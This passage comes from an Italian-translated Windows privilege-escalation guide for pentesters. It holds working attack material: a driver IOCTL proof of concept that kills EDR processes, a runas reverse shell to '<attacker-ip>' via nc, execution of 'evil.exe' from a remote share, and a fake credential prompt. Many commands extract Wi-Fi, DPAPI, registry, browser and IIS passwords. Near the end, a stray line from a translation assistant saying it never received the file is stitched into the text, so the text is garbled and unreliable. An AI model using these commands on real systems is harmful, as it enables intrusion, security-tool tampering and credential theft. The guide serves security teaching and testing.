Per bug di race-condition in cui la chiamata vulnerabile apre un Object Manager path controllato dall'attaccante, rallentare deliberatamente la lookup (usando componenti a lunghezza massima o catene di directory profonde) può estendere la finestra da microsecondi a decine di microsecondi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitive di corruzione della memoria degli hive del Registry

Le moderne vulnerabilità degli hive consentono di preparare layout deterministici, abusare dei discendenti scrivibili di HKLM/HKU e convertire la corruzione dei metadata in overflow del kernel paged-pool senza un driver custom. Scopri tutta la catena qui:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Alcuni driver di terze parti firmati creano il loro device object con un SDDL robusto tramite IoCreateDeviceSecure ma dimenticano di impostare FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Senza questo flag, la secure DACL non viene applicata quando il device viene aperto tramite un percorso che contiene un componente extra, permettendo a qualsiasi utente non privilegiato di ottenere un handle usando un namespace path come:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Una volta che un utente può aprire il device, gli IOCTL privilegiati esposti dal driver possono essere abusati per LPE e tampering. Esempi di capacità osservate nel mondo reale:
- Restituire handle con accesso completo a processi arbitrari (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminare processi arbitrari, inclusi Protected Process/Light (PP/PPL), permettendo kill di AV/EDR dallo user land tramite il kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigazioni per sviluppatori
- Impostare sempre FILE_DEVICE_SECURE_OPEN quando si creano device objects destinati a essere limitati da una DACL.
- Validare il contesto del chiamante per operazioni privilegiate. Aggiungere controlli PP/PPL prima di consentire la terminazione di un processo o la restituzione di handle.
- Limitare gli IOCTLs (access masks, METHOD_*, convalida degli input) e considerare modelli brokered invece di privilegi diretti del kernel.

Suggerimenti di rilevamento per i difensori
- Monitorare gli open in user-mode di nomi di device sospetti (e.g., \\ .\\amsdk*) e specifiche sequenze di IOCTL indicative di abuso.
- Applicare la vulnerable driver blocklist di Microsoft (HVCI/WDAC/Smart App Control) e mantenere le proprie liste allow/deny.

## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Per maggiori informazioni su come abusare di questo controllo:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Rete

### Condivisioni
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Controlla se ci sono altri computer noti hardcoded nel hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfacce di rete e DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Porte aperte

Controlla la presenza dall'esterno di **servizi ristretti**
```bash
netstat -ano #Opened ports?
```
### Tabella di routing
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Regole del firewall

[**Consulta questa pagina per i comandi relativi al firewall**](../basic-cmd-for-pentesters.md#firewall) **(elencare regole, creare regole, disattivare, disattivare...)**

Altri[ comandi per l'enumerazione della rete qui](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Il binario `bash.exe` può inoltre essere trovato in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se ottieni root puoi ascoltare su qualsiasi porta (la prima volta che usi `nc.exe` per ascoltare su una porta ti chiederà tramite GUI se `nc` deve essere autorizzato dal firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Per avviare facilmente bash come root, puoi provare `--default-user root`

Puoi esplorare il filesystem di `WSL` nella cartella `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gestore credenziali / Windows vault

Da [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Il Windows Vault memorizza le credenziali utente per server, siti web e altri programmi con cui **Windows** può **eseguire automaticamente l'accesso degli utenti**. A prima vista, potrebbe sembrare che gli utenti possano memorizzare le loro credenziali di Facebook, Twitter, Gmail ecc., in modo da effettuare automaticamente il login tramite i browser. Ma non è così.

Windows Vault memorizza le credenziali che Windows può usare per effettuare automaticamente l'accesso degli utenti, il che significa che qualsiasi **Windows application that needs credentials to access a resource** (server o un sito web) **can make use of this Credential Manager** & Windows Vault e utilizzare le credenziali fornite invece che gli utenti inseriscano username e password ogni volta.

A meno che le applicazioni non interagiscano con Credential Manager, non credo sia possibile per esse usare le credenziali per una data risorsa. Quindi, se la tua applicazione vuole usare il vault, dovrebbe in qualche modo **communicate with the credential manager and request the credentials for that resource** dal vault di storage predefinito.

Usa il `cmdkey` per elencare le credenziali memorizzate sulla macchina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Puoi quindi utilizzare `runas` con l'opzione `/savecred` per utilizzare le credenziali salvate. L'esempio seguente invoca un eseguibile remoto tramite una condivisione SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usando `runas` con un set di credenziali fornito.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Nota che mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), o dal [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

La **Data Protection API (DPAPI)** fornisce un metodo per la cifratura simmetrica dei dati, utilizzata prevalentemente all'interno del sistema operativo Windows per la cifratura simmetrica delle chiavi private asimmetriche. Questa cifratura sfrutta un segreto dell'utente o di sistema che contribuisce significativamente all'entropia.

**DPAPI consente la cifratura delle chiavi tramite una chiave simmetrica derivata dai segreti di login dell'utente**. Nei casi di cifratura di sistema, utilizza i segreti di autenticazione di dominio del sistema.

Le chiavi RSA utente cifrate, tramite DPAPI, sono memorizzate nella directory `%APPDATA%\Microsoft\Protect\{SID}`, dove `{SID}` rappresenta il [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) dell'utente. **La chiave DPAPI, collocata insieme alla master key che protegge le chiavi private dell'utente nello stesso file**, consiste tipicamente in 64 byte di dati casuali. (È importante notare che l'accesso a questa directory è ristretto, impedendo di elencarne il contenuto tramite il comando `dir` in CMD, anche se può essere elencata tramite PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Puoi usare il **mimikatz module** `dpapi::masterkey` con gli argomenti appropriati (`/pvk` o `/rpc`) per decifrarlo.

I file di **credenziali protetti dalla password principale** si trovano di solito in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Puoi usare il **mimikatz module** `dpapi::cred` con l'appropriato `/masterkey` per decriptare.\
Puoi **estrarre molte DPAPI** **masterkeys** dalla **memory** con il modulo `sekurlsa::dpapi` (se sei root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenziali PowerShell

Le **PowerShell credentials** sono spesso usate per **scripting** e attività di automazione come modo comodo per memorizzare credenziali criptate. Le credenziali sono protette usando **DPAPI**, il che normalmente significa che possono essere decriptate solo dallo stesso utente sullo stesso computer su cui sono state create.

Per **decriptare** una PS credential dal file che la contiene, puoi fare:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Connessioni RDP salvate

Puoi trovarle in `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
e in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandi eseguiti di recente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gestore delle credenziali di Desktop remoto**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Usa il modulo **Mimikatz** `dpapi::rdg` con il `/masterkey` appropriato per **decriptare qualsiasi file .rdg**\
Puoi **estrarre molti DPAPI masterkeys** dalla memoria con il modulo Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Spesso le persone usano l'app StickyNotes nelle workstation Windows per **salvare password** e altre informazioni, senza rendersi conto che si tratta di un file di database. Questo file si trova in `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` ed è sempre utile cercarlo ed esaminarlo.

### AppCmd.exe

**Nota che per recuperare le password da AppCmd.exe è necessario essere Administrator ed eseguire con un livello di integrità elevato.**\
**AppCmd.exe** si trova nella directory `%systemroot%\system32\inetsrv\`.\  
Se questo file esiste allora è possibile che siano state configurate alcune **credentials** e che possano essere **recuperate**.

Questo codice è stato estratto da [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Verifica se `C:\Windows\CCM\SCClient.exe` esiste .\
Gli installer sono **eseguiti con privilegi SYSTEM**, molti sono vulnerabili a **DLL Sideloading (Info da** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## File e Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Chiavi host
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Chiavi SSH nel registro

Le chiavi private SSH possono essere memorizzate nella chiave di registro `HKCU\Software\OpenSSH\Agent\Keys`, quindi dovresti verificare se c'è qualcosa di interessante lì:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Se trovi qualche voce all'interno di quel percorso, probabilmente si tratta di una SSH key salvata. È memorizzata criptata ma può essere facilmente decrittata usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maggiori informazioni su questa tecnica qui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Se il servizio `ssh-agent` non è in esecuzione e vuoi che si avvii automaticamente all'avvio, esegui:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Sembra che questa tecnica non sia più valida. Ho provato a creare alcune ssh keys, aggiungerle con `ssh-add` e accedere via ssh a una macchina. Il registro HKCU\Software\OpenSSH\Agent\Keys non esiste e procmon non ha identificato l'utilizzo di `dpapi.dll` durante l'autenticazione con chiave asimmetrica.

### File incustoditi
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Puoi anche cercare questi file usando **metasploit**: _post/windows/gather/enum_unattend_

Contenuto di esempio:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Copie di backup di SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenziali Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Cerca un file chiamato **SiteList.xml**

### Password GPP memorizzata

Era disponibile in passato una funzionalità che permetteva la distribuzione di account amministratore locale personalizzati su un gruppo di macchine tramite Group Policy Preferences (GPP). Tuttavia questo metodo presentava gravi vulnerabilità di sicurezza. Primo, i Group Policy Objects (GPOs), memorizzati come file XML in SYSVOL, potevano essere accessibili da qualsiasi utente di dominio. Secondo, le password contenute in questi GPP, criptate con AES256 usando una chiave predefinita documentata pubblicamente, potevano essere decriptate da qualsiasi utente autenticato. Ciò rappresentava un rischio serio, in quanto poteva permettere agli utenti di ottenere privilegi elevati.

Per mitigare questo rischio, è stata sviluppata una funzione per eseguire la scansione dei file GPP memorizzati localmente che contengono un campo "cpassword" non vuoto. Al ritrovamento di un tale file, la funzione decifra la password e restituisce un oggetto PowerShell personalizzato. Questo oggetto include dettagli sul GPP e sulla posizione del file, aiutando nell'identificazione e nella risoluzione di questa vulnerabilità di sicurezza.

Cerca in `C:\ProgramData\Microsoft\Group Policy\history` o in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ per questi file:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Per decriptare il cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Utilizzare crackmapexec per ottenere le passwords:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Configurazione Web
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Esempio di web.config con credenziali:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenziali OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Chiedere le credentials

Puoi sempre **chiedere all'utente di inserire le sue credentials o addirittura le credentials di un altro utente** se pensi che possa conoscerle (nota che **chiedere** direttamente al client le **credentials** è davvero **rischioso**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Possibili nomi di file contenenti credentials**

File noti che, tempo fa, contenevano **passwords** in **clear-text** o **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Non hai fornito il contenuto del file. Per favore incolla il contenuto di src/windows-hardening/windows-local-privilege-escalation/README.md che vuoi tradurre, oppure concedi accesso ai file. Tradurrò mantenendo intatta la sintassi markdown/HTML e le eccezioni richieste.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenziali nel Cestino

Dovresti anche controllare il Cestino per cercare credenziali al suo interno

Per **recuperare le password** salvate da diversi programmi puoi usare: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### All'interno del registro

**Altre possibili chiavi di registro contenenti credenziali**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Cronologia dei browser

Dovresti controllare i dbs dove sono memorizzate le password di **Chrome or Firefox**.\
Controlla anche la history, i bookmarks e i favourites dei browser perché magari alcune **passwords are** memorizzate lì.

Strumenti per estrarre password dai browser:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** è una tecnologia integrata nel sistema operativo Windows che permette l'**intercommunication** tra componenti software scritti in linguaggi differenti. Ogni componente COM è **identified via a class ID (CLSID)** e ogni componente espone funzionalità tramite una o più interfacce, identificate tramite interface IDs (IIDs).

Le classi e le interfacce COM sono definite nel registro sotto **HKEY\CLASSES\ROOT\CLSID** e **HKEY\CLASSES\ROOT\Interface** rispettivamente. Questo registro è creato unendo **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

All'interno dei CLSID di questo registro puoi trovare la voce figlia **InProcServer32** che contiene un **default value** che punta a una **DLL** e un valore chiamato **ThreadingModel** che può essere **Apartment** (a singolo thread), **Free** (multi-thread), **Both** (singolo o multi) o **Neutral** (thread neutral).

![](<../../images/image (729).png>)

In pratica, se riesci a **overwrite any of the DLLs** che verranno eseguite, potresti **escalate privileges** se quella DLL verrà eseguita da un utente diverso.

Per capire come gli attacker usano COM Hijacking come meccanismo di persistenza, consulta:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Cerca nel contenuto dei file**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Cerca un file con un determinato nome**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Cerca nel registro nomi di chiavi e password**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Strumenti che cercano password

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **è un msf** plugin che ho creato per **eseguire automaticamente ogni metasploit POST module che cerca credenziali** all'interno della vittima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) cerca automaticamente tutti i file che contengono password menzionati in questa pagina.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) è un altro ottimo strumento per estrarre password da un sistema.

Lo strumento [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) cerca **sessioni**, **nomi utente** e **password** di diversi tool che salvano questi dati in chiaro (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Immagina che **un processo eseguito come SYSTEM apra un nuovo processo** (`OpenProcess()`) con **full access**. Lo stesso processo **crea anche un nuovo processo** (`CreateProcess()`) **con privilegi ridotti ma che eredita tutte le handle aperte del processo principale**.\
Quindi, se hai **full access al processo a basso privilegio**, puoi prendere la **handle aperta al processo privilegiato creato** con `OpenProcess()` e **iniettare uno shellcode**.\
[Leggi questo esempio per maggiori informazioni su **come rilevare e sfruttare questa vulnerabilità**.](leaked-handle-exploitation.md)\
[Leggi questo **altro post per una spiegazione più completa su come testare e abusare di altre open handlers di processi e thread ereditate con diversi livelli di permessi (non solo full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

I segmenti di memoria condivisa, chiamati **pipes**, consentono la comunicazione tra processi e il trasferimento di dati.

